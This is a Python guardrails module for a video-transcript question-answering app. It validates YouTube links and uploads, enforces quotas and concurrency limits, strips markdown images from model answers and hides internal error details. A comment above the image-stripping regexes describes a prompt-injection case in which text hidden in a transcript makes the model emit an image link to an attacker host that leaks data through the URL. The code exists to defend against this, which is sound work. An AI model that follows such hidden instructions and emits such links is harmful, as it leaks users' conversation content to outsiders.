"""
Checks that run before anything costs money or touches the disk, plus the
cleanup of what goes back to the user:

- inputs: YouTube-only links, upload type and size, question length;
- spend: per-user daily quotas, a per-minute question limit, and a cap on
  videos processed at once;
- outputs: answers lose embedded images, and errors lose internal details.
"""
import logging
import os
import re
import secrets
import shutil
import threading
import time
from contextlib import contextmanager
from urllib.parse import urlsplit

from core import db
from core.errors import GuardrailError, QuotaExceeded, UserFacingError
from core.settings import get_settings

log = logging.getLogger(__name__)

# Upload extension -> FFmpeg demuxer. Uploads are decoded with this format
# forced, so a file can't pick its own demuxer: a text playlist renamed to
# .mp4 is rejected instead of being followed to other files.
UPLOAD_FORMATS = {
    "mp3": "mp3",
    "wav": "wav",
    "m4a": "mp4",
    "mp4": "mp4",
    "mkv": "matroska",
    "webm": "webm",
    "aac": "aac",
}


def day_start() -> float:
    """Quotas reset at 00:00 UTC."""
    now = time.time()
    return now - (now % 86400)


# Inputs

def validate_video_url(url: str) -> str:
    """
    Accept only http(s) links to YouTube hosts. Anything else, such as a server
    path, a file:// link or an internal address, never reaches yt-dlp.
    """
    url = (url or "").strip()
    if not url:
        raise GuardrailError("Paste a YouTube link.")
    if len(url) > 300:
        raise GuardrailError("That link is too long.")
    if any(c.isspace() or ord(c) < 32 or c == "\\" for c in url):
        raise GuardrailError("That doesn't look like a valid link.")
    try:
        parts = urlsplit(url)
        port = parts.port
    except ValueError:
        raise GuardrailError("That doesn't look like a valid link.")
    if parts.scheme not in ("http", "https"):
        raise GuardrailError("Paste a YouTube link that starts with https://")
    if parts.username or parts.password or port not in (None, 80, 443):
        raise GuardrailError("That doesn't look like a valid YouTube link.")
    host = (parts.hostname or "").rstrip(".")
    if host not in get_settings().allowed_video_hosts:
        raise GuardrailError("Only YouTube links are supported.")
    return url


def validate_upload(filename: str, size: int) -> str:
    """Return the FFmpeg format to decode the upload with."""
    ext = os.path.splitext(filename or "")[1].lower().lstrip(".")
    if ext not in UPLOAD_FORMATS:
        raise GuardrailError(f"Upload one of: {', '.join(UPLOAD_FORMATS)}.")
    if size <= 0:
        raise GuardrailError("That file is empty.")
    limit_mb = get_settings().max_upload_mb
    if size > limit_mb * 1024 * 1024:
        raise GuardrailError(f"Files can be at most {limit_mb} MB.")
    return UPLOAD_FORMATS[ext]


def check_question(user, question: str) -> str:
    """Validate a chat message and count it against the user's limits."""
    settings = get_settings()
    question = (question or "").strip()
    if not question:
        raise GuardrailError("Type a question first.")
    if len(question) > settings.max_question_chars:
        raise GuardrailError(f"Questions can be at most {settings.max_question_chars} characters.")

    # The per-minute limit applies to admins too: it stops runaway scripts or
    # a stuck key, not ordinary use.
    if db.total_since(user.id, "question", time.time() - 60) >= settings.questions_per_minute:
        raise QuotaExceeded("You're sending questions too quickly. Wait a minute and try again.")
    if not user.is_admin and db.total_since(user.id, "question", day_start()) >= settings.questions_per_day:
        raise QuotaExceeded(
            f"You've reached today's limit of {settings.questions_per_day} questions. It resets at 00:00 UTC."
        )
    db.record_event(user.id, "question")
    return question


# Video processing quotas

def check_disk_space():
    """Applies to everyone: a full disk breaks the app for all users."""
    settings = get_settings()
    os.makedirs(settings.data_dir, exist_ok=True)
    free_gb = shutil.disk_usage(settings.data_dir).free / 1024 ** 3
    if free_gb < settings.min_free_disk_gb:
        log.error("disk nearly full: %.1f GB free in %s", free_gb, settings.data_dir)
        raise GuardrailError("The server is low on storage, so new videos are paused. Tell the admin.")


def check_can_start_video(user):
    """Cheap check before any download, so a user over quota costs nothing."""
    check_disk_space()
    if user.is_admin:
        return
    settings = get_settings()
    since = day_start()
    if db.total_since(user.id, "video", since) >= settings.videos_per_day:
        raise QuotaExceeded(
            f"You've reached today's limit of {settings.videos_per_day} videos. It resets at 00:00 UTC."
        )
    if db.total_since(user.id, "audio_minutes", since) >= settings.audio_minutes_per_day:
        raise QuotaExceeded(
            f"You've used today's {settings.audio_minutes_per_day} minutes of processing. It resets at 00:00 UTC."
        )


def charge_video(user, minutes: float):
    """
    Called once the audio length is known and before transcription, the first
    step that costs money. A job that fails later still counts, since the
    transcription was paid for.
    """
    settings = get_settings()
    if not user.is_admin:
        used = db.total_since(user.id, "audio_minutes", day_start())
        left = settings.audio_minutes_per_day - used
        if minutes > left:
            raise QuotaExceeded(
                f"This recording is {minutes:.0f} min, but you have {max(0, left):.0f} min "
                "of processing left today. It resets at 00:00 UTC."
            )
    db.record_event(user.id, "video")
    db.record_event(user.id, "audio_minutes", round(minutes, 2))


def usage_summary(user) -> dict:
    settings = get_settings()
    since = day_start()
    return {
        "videos": int(db.total_since(user.id, "video", since)),
        "videos_limit": settings.videos_per_day,
        "minutes": db.total_since(user.id, "audio_minutes", since),
        "minutes_limit": settings.audio_minutes_per_day,
        "questions": int(db.total_since(user.id, "question", since)),
        "questions_limit": settings.questions_per_day,
    }


# Concurrency

_jobs_lock = threading.Lock()
_active_jobs = set()   # user ids with a video processing


@contextmanager
def job_slot(user_id: str):
    """
    One video at a time per user, and at most MAX_CONCURRENT_JOBS in total.
    Processing is CPU- and memory-heavy, and every session shares one process.
    """
    with _jobs_lock:
        if user_id in _active_jobs:
            raise GuardrailError("You already have a video processing. Wait for it to finish.")
        if len(_active_jobs) >= get_settings().max_concurrent_jobs:
            raise GuardrailError("The server is busy processing other videos. Try again in a few minutes.")
        _active_jobs.add(user_id)
    try:
        yield
    finally:
        with _jobs_lock:
            _active_jobs.discard(user_id)


# Outputs

# Markdown images load as soon as the answer renders, so an instruction hidden
# in a transcript could make the model emit ![](https://attacker/?q=...) and
# leak text through the URL. Keep the alt text and drop the image.
_INLINE_IMAGE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
_REF_IMAGE = re.compile(r"!\[([^\]]*)\]\[[^\]]*\]")


def clean_answer(text: str) -> str:
    text = _INLINE_IMAGE.sub(r"\1", text or "")
    text = _REF_IMAGE.sub(r"\1", text)
    return text.strip()


_FRIENDLY = {
    "APIConnectionError": "Couldn't reach the AI service. Try again in a moment.",
    "APITimeoutError": "The AI service took too long to answer. Try again in a moment.",
    "ConnectionError": "Couldn't reach a transcription or AI service. Try again in a moment.",
    "Timeout": "A transcription or AI service took too long to answer. Try again.",
    "ReadTimeout": "A transcription or AI service took too long to answer. Try again.",
    "ConnectTimeout": "Couldn't reach a transcription or AI service. Try again in a moment.",
    "RateLimitError": "The AI service is rate-limiting this app or is out of credit. Try again later.",
    "DownloadError": (
        "YouTube refused the download. The video may be private, age-restricted or "
        "region-locked, or YouTube may be blocking this server. Try uploading the audio file instead."
    ),
}


def user_message(exc: BaseException) -> str:
    """
    What to show the user for an exception. Our own refusals pass through;
    anything else is logged in full with a reference, and the user sees a
    generic message with that reference, never paths, keys or provider responses.
    """
    if isinstance(exc, UserFacingError):
        return str(exc)
    ref = secrets.token_hex(3)
    log.error("unhandled error ref=%s", ref, exc_info=exc)
    friendly = _FRIENDLY.get(type(exc).__name__)
    if friendly:
        return f"{friendly} (ref {ref})"
    return f"Something went wrong (ref {ref}). Try again; if it keeps happening, tell the admin this ref."
